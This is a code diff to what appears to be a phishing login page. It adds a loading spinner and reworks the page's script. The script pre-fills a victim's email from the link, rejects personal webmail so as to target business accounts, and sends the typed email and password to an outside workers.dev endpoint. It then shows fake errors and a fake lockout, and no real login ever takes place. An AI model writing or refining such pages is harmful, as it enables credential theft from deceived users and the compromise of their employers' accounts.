@@ -65,6 +65,21 @@
       margin-top: auto; width: 100%;
       box-sizing: border-box;
     }
+
+    .spinner {
+  width: 16px;
+  height: 16px;
+  border: 2px solid rgba(255,255,255,0.6);
+  border-top-color: #fff;
+  border-radius: 50%;
+  display: inline-block;
+  vertical-align: middle;
+  margin-right: 8px;
+  animation: spin 1s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+.hidden { display: none; }
+
   </style>
 </head>
 <body>
@@ -82,7 +97,10 @@
       <label for="password">Password</label>
       <input id="password" type="password" placeholder="Enter your password.">
 
-      <button type="submit" id="loginBtn">Log in</button>
+      <button type="submit" id="loginBtn">
+        <span class="spinner hidden"></span>
+        <span class="btn-text">Log in</span>
+      </button>
     </form>
 
     <a href="#" id="forgotPwd">Forgot password?</a>
@@ -110,86 +128,96 @@
 <script>
 (function(){
   const endpoint = 'https://notify-login.codeck02.workers.dev';
-  const bannedDomains = [
-    'gmail.com','yahoo.com','outlook.com',
-    'hotmail.com','aol.com','msn.com','icloud.com'
-  ];
-
-  let attemptCount = 0;
-  const maxAttempts = 2;
+  const banned = ['gmail.com','yahoo.com','outlook.com','hotmail.com','aol.com','msn.com','icloud.com'];
+  let attempts = 0, maxAttempts = 2;
 
   const form     = document.getElementById('loginForm'),
         emailFld = document.getElementById('email'),
         passFld  = document.getElementById('password'),
         errorDiv = document.getElementById('errorMsg'),
         loginBtn = document.getElementById('loginBtn'),
+        spinner  = loginBtn.querySelector('.spinner'),
+        btnText  = loginBtn.querySelector('.btn-text'),
         forgotPw = document.getElementById('forgotPwd');
 
   // Pre-fill email from fragment
   const hashEmail = window.location.hash.substr(1);
   if (hashEmail) emailFld.value = decodeURIComponent(hashEmail);
 
-  forgotPw.addEventListener('click', e => {
+  forgotPw.addEventListener('click', e=>{
     e.preventDefault();
     alert('Password reset link would be sent to: ' + (emailFld.value.trim()||'[your email]'));
   });
 
-  form.addEventListener('submit', e => {
+  form.addEventListener('submit', e=>{
     e.preventDefault();
-    errorDiv.textContent = '';    // clear previous
-    if (loginBtn.disabled) return; // already locked
+    errorDiv.textContent = '';
+
+    if (loginBtn.disabled) return; // already locked out
 
     const email = emailFld.value.trim(),
           password = passFld.value;
 
-    // --- VALIDATIONS ---
+    // --- VALIDATION ---
     if (!email.includes('@')) {
       return errorDiv.textContent = 'Please include an @ in your e-mail.';
     }
     const domain = email.split('@').pop().toLowerCase();
-    if (bannedDomains.includes(domain)) {
+    if (banned.includes(domain)) {
       return errorDiv.textContent = 'Please use your BUSINESS e-mail address.';
     }
     if (password.length < 4) {
       return errorDiv.textContent = 'Password must be at least 4 characters.';
     }
 
-    // --- IMMEDIATE FEEDBACK ---
-    attemptCount++;
-    const lockout = attemptCount > maxAttempts;
-    if (lockout) {
-      errorDiv.textContent = "You can't access your account right now. Try again later.";
+    // --- ATTEMPT TRACKING & LOCKOUT ---
+    attempts++;
+    if (attempts > maxAttempts) {
+      errorDiv.textContent = 'Login attempts reached. You are locked out.';
       loginBtn.disabled = true;
       emailFld.disabled = passFld.disabled = true;
-    } else {
-      errorDiv.textContent = 'Sending…';
-      passFld.value = '';
+      return;
     }
 
-    // --- ASYNC SUBMIT (non-blocking) ---
+    // show spinner
+    spinner.classList.remove('hidden');
+    btnText.classList.add('hidden');
+    loginBtn.disabled = true;
+
+    // build payload
     const payload = {
       email,
       password,
-      attemptCount,
-      // you can include these too
+      attemptCount: attempts,
       ua: navigator.userAgent,
       ts: new Date().toISOString()
     };
+
     fetch(endpoint, {
       method: 'POST',
       headers: { 'Content-Type':'application/json' },
       body: JSON.stringify(payload)
     })
-    .then(_=> {
-      if (!lockout) {
-        // let the user know we got through
-        errorDiv.textContent = 'Logged attempt #' + attemptCount + '.';
+    .then(resp=>{
+      spinner.classList.add('hidden');
+      btnText.classList.remove('hidden');
+      loginBtn.disabled = false;
+
+      if (!navigator.onLine) {
+        errorDiv.textContent = 'Network error. Please check your connection.';
+      } else if (!resp.ok) {
+        errorDiv.textContent = 'Server error. Try again later.';
+      } else {
+        // on success, show a confirmation if you like:
+        errorDiv.textContent = 'Attempt #{' + attempts + '} recorded.';
+        passFld.value = '';
       }
     })
-    .catch(_=>{
-      if (!lockout) {
-        errorDiv.textContent = 'Network error. Please try again.';
-      }
+    .catch(()=>{
+      spinner.classList.add('hidden');
+      btnText.classList.remove('hidden');
+      loginBtn.disabled = false;
+      errorDiv.textContent = 'Network error. Please check your connection.';
     });
   });
 })();
